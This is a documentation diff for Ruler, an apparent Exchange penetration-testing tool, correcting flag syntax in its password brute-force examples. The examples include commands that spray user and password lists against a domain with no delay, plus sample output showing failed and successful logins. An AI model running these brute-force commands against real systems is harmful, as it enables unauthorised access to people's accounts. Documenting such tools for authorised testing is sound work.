@@ -125,12 +125,12 @@ GLOBAL OPTIONS:
 If you go the brute-force route, Ruler is your friend. It has a built-in brute-forcer which does a semi-decent job of finding creds.
 
 ```
-./ruler --domain targetdomain.com brute --users /path/to/user.txt -passwords /path/to/passwords.txt
+./ruler --domain targetdomain.com brute --users /path/to/user.txt --passwords /path/to/passwords.txt
 ```
 You should see your brute-force in action:
 
 ```
-./ruler --domain evilcorp.ninja brute --users ~/users.txt --passwords ~/passwords.txt --delay 0 --insecure --verbose
+./ruler --domain evilcorp.ninja --insecure brute --users ~/users.txt --passwords ~/passwords.txt --delay 0  --verbose
 
 [*] Starting bruteforce
 [x] Failed: cindy.baker:P@ssw0rd
@@ -155,7 +155,7 @@ You should see your brute-force in action:
 [x] Failed: henry.hammond:Eish
 ```
 
-Alternatively, you can specify a userpass file with the ```-userpass``` option. The userpass file should be colon-delimited with one pair of credentials per line:
+Alternatively, you can specify a userpass file with the ```--userpass``` option. The userpass file should be colon-delimited with one pair of credentials per line:
 
 ```
 $ cat userpass.txt
@@ -163,7 +163,7 @@ john.ford:August2016
 henry.hammond:Password!2016
 cindy.baker:Password1
 
-./ruler --domain evilcorp.ninja brute --userpass userpass.txt -v --insecure
+./ruler --domain evilcorp.ninja --insecure brute --userpass userpass.txt -v 
 
 [*] Starting bruteforce
 [+] Success: john.ford:August2016
